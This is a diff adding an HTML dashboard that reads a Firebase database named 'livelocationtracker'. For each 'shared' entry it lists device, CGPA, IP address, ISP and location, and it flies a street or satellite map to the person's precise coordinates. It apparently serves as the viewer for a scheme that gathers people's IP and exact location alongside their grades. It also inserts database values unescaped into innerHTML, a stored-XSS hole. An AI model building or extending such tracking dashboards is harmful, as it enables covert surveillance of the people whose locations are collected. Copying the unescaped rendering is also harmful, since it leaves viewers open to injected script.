@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>View Shared Details - AJ STUDIOZ</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+body { font-family:'Poppins',sans-serif; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; background:linear-gradient(135deg,#100721,#1a1a2e); color:#fff; min-height:100vh; }
+.container { max-width:900px; width:100%; padding:20px; margin-top:20px; background:rgba(16,7,33,0.6); border-radius:15px; backdrop-filter:blur(20px); border:1px solid rgba(255,255,255,0.15);}
+h1{text-align:center; margin-bottom:20px;}
+.entry { background: rgba(255,255,255,0.1); padding:10px 15px; margin:10px 0; border-radius:12px; cursor:pointer; transition:0.3s; }
+.entry:hover { background: rgba(255,255,255,0.2); }
+.entry p { margin:3px 0; font-size:0.95rem; }
+
+/* Modal */
+.modal { display:none; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; overflow:auto; background:rgba(0,0,0,0.7); }
+.modal-content { background: rgba(16,7,33,0.95); margin:5% auto; padding:20px; border-radius:12px; max-width:650px; color:#fff; position:relative; }
+.close { position:absolute; top:10px; right:15px; font-size:24px; font-weight:bold; cursor:pointer; }
+#modalMap { width:100%; height:350px; margin-top:15px; border-radius:12px; }
+.map-toggle { margin-top:10px; text-align:center; }
+.map-toggle button { padding:8px 12px; margin:0 5px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s;}
+.map-toggle button:hover{opacity:0.8;}
+.loader{display:none; margin:10px auto; text-align:center;}
+.loader span{display:inline-block;width:24px;height:24px;border:4px solid #0d47a1;border-top:4px solid transparent;border-radius:50%; animation:spin 1s linear infinite;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+/* Responsive */
+@media (max-width:700px){ .modal-content{width:90%;} #modalMap{height:250px;} }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Shared Device & CGPA Details</h1>
+  <div class="loader" id="loader"><span></span></div>
+  <div id="entries"></div>
+</div>
+
+<!-- Modal for details -->
+<div id="detailModal" class="modal">
+  <div class="modal-content">
+    <span class="close" id="closeModal">&times;</span>
+    <div id="modalDetails"></div>
+    <div class="map-toggle">
+      <button id="streetBtn">Street View</button>
+      <button id="satBtn">Satellite View</button>
+    </div>
+    <div id="modalMap"></div>
+  </div>
+</div>
+
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+// Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyCxMU9PstROo2hYxwiAFsSacjJOSPCN6Ag",
+  authDomain: "livelocationtracker-bcd3d.firebaseapp.com",
+  databaseURL: "https://livelocationtracker-bcd3d-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "livelocationtracker-bcd3d",
+  storageBucket: "livelocationtracker-bcd3d.appspot.com",
+  messagingSenderId: "800051113276",
+  appId: "1:800051113276:web:61f0162a9e95aba9cb4239"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const entriesDiv = document.getElementById("entries");
+const loader = document.getElementById("loader");
+
+// Modal elements
+const modal = document.getElementById("detailModal");
+const closeModal = document.getElementById("closeModal");
+const modalDetails = document.getElementById("modalDetails");
+const modalMapDiv = document.getElementById("modalMap");
+const streetBtn = document.getElementById("streetBtn");
+const satBtn = document.getElementById("satBtn");
+
+let modalMap, modalMarker, currentLayer;
+
+closeModal.onclick = ()=>{ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} }
+window.onclick = (e)=>{ if(e.target==modal){ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} } }
+
+const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution: '&copy; OpenStreetMap contributors' });
+const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', { maxZoom:20, subdomains:['mt0','mt1','mt2','mt3'], attribution:'&copy; Google Satellite' });
+
+onValue(ref(db,"locations"), snapshot => {
+  entriesDiv.innerHTML = "";
+  loader.style.display = "block";
+  const data = snapshot.val();
+  if(data){
+    Object.keys(data).sort((a,b)=>data[b].timestamp - data[a].timestamp).forEach(key=>{
+      const entry = data[key];
+      const div = document.createElement("div");
+      div.className = "entry";
+      div.innerHTML = `
+        <p><b>Device:</b> ${entry.device}</p>
+        <p><b>CGPA:</b> ${entry.cgpa}</p>
+        <p><b>IP:</b> ${entry.ip}</p>
+        <p><b>ISP:</b> ${entry.isp || 'N/A'}</p>
+        <p><b>Location:</b> ${entry.city}, ${entry.region}, ${entry.country}</p>
+        <p><b>Shared on:</b> ${new Date(entry.timestamp).toLocaleString()}</p>
+        <p style="font-size:0.8rem;color:#ccc;">Click to view on map</p>
+      `;
+      div.addEventListener("click", ()=>{
+        modal.style.display="block";
+        modalDetails.innerHTML = `
+          <p><b>Device:</b> ${entry.device}</p>
+          <p><b>CGPA:</b> ${entry.cgpa}</p>
+          <p><b>IP:</b> ${entry.ip}</p>
+          <p><b>ISP:</b> ${entry.isp || 'N/A'}</p>
+          <p><b>City:</b> ${entry.city}</p>
+          <p><b>Region:</b> ${entry.region}</p>
+          <p><b>Country:</b> ${entry.country}</p>
+          <p><b>Shared on:</b> ${new Date(entry.timestamp).toLocaleString()}</p>
+        `;
+        if(modalMap){ modalMap.remove(); modalMap=null; }
+        modalMap = L.map(modalMapDiv).setView([20,0],2);
+        currentLayer = streetLayer.addTo(modalMap);
+        setTimeout(()=>{
+          modalMap.flyTo([entry.lat, entry.lon],15, {animate:true,duration:3});
+          modalMarker = L.marker([entry.lat, entry.lon]).addTo(modalMap)
+            .bindPopup(`Device: ${entry.device}<br>CGPA: ${entry.cgpa}<br>${entry.city}, ${entry.region}, ${entry.country}<br>ISP: ${entry.isp || 'N/A'}`)
+            .openPopup();
+        },300);
+      });
+      entriesDiv.appendChild(div);
+    });
+  } else {
+    entriesDiv.innerHTML = "<p>No shared details found.</p>";
+  }
+  loader.style.display = "none";
+});
+
+// Map toggle buttons
+streetBtn.onclick = ()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer = streetLayer.addTo(modalMap); } };
+satBtn.onclick = ()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer = satLayer.addTo(modalMap); } };
+</script>
+</body>
+</html>
